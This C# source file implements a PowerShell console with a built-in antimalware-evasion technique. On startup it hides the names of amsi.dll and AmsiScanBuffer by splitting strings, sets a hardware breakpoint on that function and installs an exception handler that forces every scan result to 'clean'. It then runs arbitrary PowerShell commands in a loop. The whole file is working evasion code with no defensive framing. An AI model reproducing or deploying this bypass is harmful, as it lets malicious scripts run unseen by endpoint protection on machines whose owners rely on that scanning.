using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Test;

namespace Test
{

    public class PS
    {
        public Runspace runspace;

        public PS()
        {
            Program.SetupBypass();

            RunspaceConfiguration runspaceConfiguration = RunspaceConfiguration.Create();
            this.runspace = RunspaceFactory.CreateRunspace(runspaceConfiguration);
            this.runspace.Open();

        }
        public string exe(string cmd)
        {
            try
            {
                Pipeline pipeline = runspace.CreatePipeline();
                pipeline.Commands.AddScript(cmd);
                pipeline.Commands.Add("Out-String");
                Collection<PSObject> results = pipeline.Invoke();
                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    foreach (string line in obj.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
                    {
                        stringBuilder.AppendLine(line.TrimEnd());
                    }
                }
                return stringBuilder.ToString();
            }
            catch (Exception e)
            {
                // Let the user know what went wrong.

                string errorText = e.Message + "\n";
                return (errorText);
            }
        }
        public void close()
        {
            this.runspace.Close();
        }
    }
}
class Program
{
    static PS ps;


    static string a = "msi";
    static string b = "anB";
    static string c = "ff";
    static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
    static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
    static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));

    public static void SetupBypass()
    {
        WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
        ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;

        MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
        IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());

        // Saving our context to a struct
        Marshal.StructureToPtr(ctx, pCtx, true);
        bool b = WinAPI.GetThreadContext(WinAPI.GetCurrentThread(), pCtx);
        ctx = (WinAPI.CONTEXT64)Marshal.PtrToStructure(pCtx, typeof(WinAPI.CONTEXT64));

        EnableBreakpoint(ctx, pABuF, 0);

        WinAPI.SetThreadContext(WinAPI.GetCurrentThread(), pCtx);
        
    }

    public static long Handler(IntPtr exceptions)
    {
        WinAPI.EXCEPTION_POINTERS ep = new WinAPI.EXCEPTION_POINTERS();
        ep = (WinAPI.EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptions, typeof(WinAPI.EXCEPTION_POINTERS));

        WinAPI.EXCEPTION_RECORD ExceptionRecord = new WinAPI.EXCEPTION_RECORD();
        ExceptionRecord = (WinAPI.EXCEPTION_RECORD)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(WinAPI.EXCEPTION_RECORD));

        WinAPI.CONTEXT64 ContextRecord = new WinAPI.CONTEXT64();
        ContextRecord = (WinAPI.CONTEXT64)Marshal.PtrToStructure(ep.pContextRecord, typeof(WinAPI.CONTEXT64));

        if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && ExceptionRecord.ExceptionAddress == pABuF)
        {
            ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);

            // THE OUTPUT AMSIRESULT IS A POINTER, NOT THE EXPLICIT VALUE AAAAAAAAAA
            IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean
                                                                                           //Console.WriteLine("Buffer: 0x{0:X}", (long)ContextRecord.R8);
                                                                                           //Console.WriteLine("Scan Result: 0x{0:X}", Marshal.ReadInt32(ScanResult));

            Marshal.WriteInt32(ScanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

            ContextRecord.Rip = ReturnAddress;
            ContextRecord.Rsp += 8;
            ContextRecord.Rax = 0; // S_OK

            Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true); //Paste our altered ctx back in TO THE RIGHT STRUCT
            return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
        }
        else
        {
            return WinAPI.EXCEPTION_CONTINUE_SEARCH;
        }

    }
    public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
    {

        switch (index)
        {
            case 0:
                ctx.Dr0 = (ulong)address.ToInt64();
                break;
            case 1:
                ctx.Dr1 = (ulong)address.ToInt64();
                break;
            case 2:
                ctx.Dr2 = (ulong)address.ToInt64();
                break;
            case 3:
                ctx.Dr3 = (ulong)address.ToInt64();
                break;
        }

        //Set bits 16-31 as 0, which sets
        //DR0-DR3 HBP's for execute HBP
        ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);

        //Set DRx HBP as enabled for local mode
        ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
        ctx.Dr6 = 0;

        // Now copy the changed ctx into the original struct
        Marshal.StructureToPtr(ctx, pCtx, true);
    }
    public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
    {
        ulong mask = (1UL << bits) - 1UL;
        dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
        return dw;
    }

    public class WinAPI
    {
        public const UInt32 DBG_CONTINUE = 0x00010002;
        public const UInt32 DBG_EXCEPTION_NOT_HANDLED = 0x80010001;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 CREATE_PROCESS_DEBUG_EVENT = 3;
        public const Int32 CREATE_THREAD_DEBUG_EVENT = 2;
        public const Int32 EXCEPTION_DEBUG_EVENT = 1;
        public const Int32 EXIT_PROCESS_DEBUG_EVENT = 5;
        public const Int32 EXIT_THREAD_DEBUG_EVENT = 4;
        public const Int32 LOAD_DLL_DEBUG_EVENT = 6;
        public const Int32 OUTPUT_DEBUG_STRING_EVENT = 8;
        public const Int32 RIP_EVENT = 9;
        public const Int32 UNLOAD_DLL_DEBUG_EVENT = 7;

        public const UInt32 EXCEPTION_ACCESS_VIOLATION = 0xC0000005;
        public const UInt32 EXCEPTION_BREAKPOINT = 0x80000003;
        public const UInt32 EXCEPTION_DATATYPE_MISALIGNMENT = 0x80000002;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;
        public const UInt32 EXCEPTION_ARRAY_BOUNDS_EXCEEDED = 0xC000008C;
        public const UInt32 EXCEPTION_INT_DIVIDE_BY_ZERO = 0xC0000094;
        public const UInt32 DBG_CONTROL_C = 0x40010006;
        public const UInt32 DEBUG_PROCESS = 0x00000001;
        public const UInt32 CREATE_SUSPENDED = 0x00000004;
        public const UInt32 CREATE_NEW_CONSOLE = 0x00000010;

        public const Int32 AMSI_RESULT_CLEAN = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);


        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);
        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT64_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            public uint ExceptionCode;
            public uint ExceptionFlags;
            public IntPtr ExceptionRecord;
            public IntPtr ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)] public uint[] ExceptionInformation;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }


    public static string exe(string cmd)
    {
        try
        {
            Pipeline pipeline = ps.runspace.CreatePipeline();
            pipeline.Commands.AddScript(cmd);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            System.Text.StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                foreach (string line in obj.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
                {
                    stringBuilder.AppendLine(line.TrimEnd());
                }
            }
            return stringBuilder.ToString();
        }
        catch (Exception e)
        {
            // Let the user know what went wrong.

            string errorText = e.Message + "\n";
            return (errorText);
        }
    }

    public static string LoadScript(string filename)
    {
        try
        {
            using (StreamReader sr = new StreamReader(filename))
            {
                StringBuilder fileContents = new StringBuilder();
                string curLine;
                while ((curLine = sr.ReadLine()) != null)
                {
                    fileContents.Append(curLine + "\n");
                }
                return fileContents.ToString();
            }
        }
        catch (Exception e)
        {
            string errorText = e.Message + "\n";
            Console.WriteLine(errorText);
            return ("error");
        }
    }



    static void Main(string[] args)
    {



        ps = new PS();

        string cmd = "";

        while (cmd.ToLower() != "exit")
        {
            Console.Write("PS " + ps.exe("$(get-location).Path").Replace(System.Environment.NewLine, String.Empty) + ">");
            cmd = Console.ReadLine();
            Console.WriteLine(ps.exe(cmd));
        }
    }


}